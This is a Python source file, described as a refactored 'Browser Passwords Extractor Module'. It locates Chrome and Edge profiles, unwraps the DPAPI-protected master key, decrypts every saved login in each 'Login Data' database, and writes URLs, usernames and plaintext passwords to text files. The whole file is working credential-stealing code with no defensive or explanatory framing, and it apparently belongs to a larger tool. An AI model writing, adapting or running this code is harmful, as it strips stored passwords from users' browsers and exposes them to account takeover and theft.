"""
Browser Passwords Extractor Module
Refactored from passwords.py for better integration
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
from pathlib import Path
from typing import Iterable, Tuple, List, Dict

try:
    from Crypto.Cipher import AES
except Exception:
    AES = None

try:
    import win32crypt
except Exception:
    win32crypt = None

def _require_crypto_deps():
    if AES is None:
        raise RuntimeError("pycryptodome is not available. Install with: pip install pycryptodome")
    if win32crypt is None:
        raise RuntimeError("pywin32 is not available. Install with: pip install pywin32")

def load_chromium_key(key_file: Path) -> bytes:
    _require_crypto_deps()
    try:
        with open(key_file, "r", encoding="utf-8") as f:
            js = json.load(f)
        ek_b64 = js["os_crypt"]["encrypted_key"]
        ek = base64.b64decode(ek_b64)[5:]  # strip 'DPAPI'
        key = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
        if not key:
            raise RuntimeError("DPAPI returned empty key")
        return key
    except Exception as e:
        print(f"[Key] Failed to load/decrypt AES key from '{key_file}': {e!s}")
        return b""

def decrypt_chromium_value(enc: bytes, key: bytes) -> str:
    _require_crypto_deps()
    if not enc:
        return ""
    try:
        hdr = enc[:3]
        if len(hdr) == 3 and hdr[0:1] == b"v" and all(48 <= b <= 57 for b in hdr[1:3]):
            nonce = enc[3:15]
            ct = enc[15:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct[:-16], ct[-16:]).decode("utf-8", "ignore")
        dec = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
        return dec.decode("utf-8", "ignore")
    except Exception:
        return ""

def with_temp_copy(src: Path) -> Path:
    tmpdir = Path(tempfile.mkdtemp(prefix="pwd_"))
    dst = tmpdir / src.name
    try:
        shutil.copy2(src, dst)
        return dst
    except Exception as e:
        print(f"[Copy] Could not copy DB '{src}': {e!s}. Will try direct read.")
        return src

def chromium_profile_paths(vendor: str):
    base = Path(os.getenv("LOCALAPPDATA", "")) / vendor / "User Data"
    key_file = base / "Local State"
    if not base.exists():
        return
    candidates = [base / "Default"] + sorted(p for p in base.glob("Profile *") if p.is_dir())
    for prof in candidates:
        login_data = prof / "Login Data"
        if login_data.exists():
            yield login_data, key_file, prof.name

def make_chromium_label(vendor: str, prof_name: str) -> str:
    if vendor.startswith("Google/Chrome"):
        prefix = "Google_[Chrome]"
    elif vendor.startswith("Microsoft/Edge"):
        prefix = "Microsoft_[Edge]"
    else:
        prefix = vendor
    return f"{prefix}_{prof_name}"

def write_password_file(path: Path, items: List[Tuple[str, str, str]]):
    with open(path, "w", encoding="utf-8") as f:
        f.write("# Browser Passwords: URL | Username | Password\n")
        for url, username, password in items:
            f.write(f"{url} | {username} | {password}\n")

def iter_chromium_passwords(login_db: Path, key_file: Path, label: str) -> Iterable[Tuple[str, str, str]]:
    key = load_chromium_key(key_file)
    if not key:
        print(f"[{label}] Skipped: cannot obtain AES key")
        return
    src = with_temp_copy(login_db)
    try:
        with sqlite3.connect(str(src)) as conn:
            conn.row_factory = sqlite3.Row
            cur = conn.execute("""
                SELECT origin_url, username_value, password_value
                FROM logins
                WHERE origin_url IS NOT NULL AND username_value IS NOT NULL
            """)
            for r in cur:
                url = r["origin_url"] or ""
                username = r["username_value"] or ""
                enc_password = r["password_value"]
                if isinstance(enc_password, (bytes, bytearray, memoryview)):
                    password = decrypt_chromium_value(enc_password, key) or ""
                else:
                    password = ""
                if url and username and password:
                    yield (url, username, password)
    except Exception as e:
        print(f"[{label}] Failed reading passwords: {e!s}")

def get_browser_passwords(output_dir="Passwords"):
    """Extract browser passwords and save to files"""
    outdir = Path(output_dir)
    outdir.mkdir(parents=True, exist_ok=True)
    per_profile = {}
    total_files = 0
    total_rows = 0

    # --- Chrome ---
    any_chrome = False
    for login_db, key_file, prof_name in chromium_profile_paths("Google/Chrome"):
        any_chrome = True
        print(f"[Chrome] Using profile '{prof_name}': {login_db}")
        label = make_chromium_label("Google/Chrome", prof_name)
        passwords = list(iter_chromium_passwords(login_db, key_file, f"Chrome:{prof_name}"))
        if passwords:
            per_profile[label] = passwords
    if not any_chrome:
        print("[Chrome] No explicit profile paths found.")

    # --- Edge ---
    any_edge = False
    for login_db, key_file, prof_name in chromium_profile_paths("Microsoft/Edge"):
        any_edge = True
        print(f"[Edge] Using profile '{prof_name}': {login_db}")
        label = make_chromium_label("Microsoft/Edge", prof_name)
        passwords = list(iter_chromium_passwords(login_db, key_file, f"Edge:{prof_name}"))
        if passwords:
            per_profile[label] = passwords
    if not any_edge:
        print("[Edge] No explicit profile paths found.")

    # --- Write password files ---
    for label, items in per_profile.items():
        profile_path = outdir / f"{label}_Passwords.txt"
        write_password_file(profile_path, items)
        print(f"[Write] {label}_Passwords.txt ({len(items)} rows)")
        total_files += 1
        total_rows += len(items)

    print(f"[Done] Wrote {total_files} files into '{outdir.resolve()}', total password rows: {total_rows}")
    return True
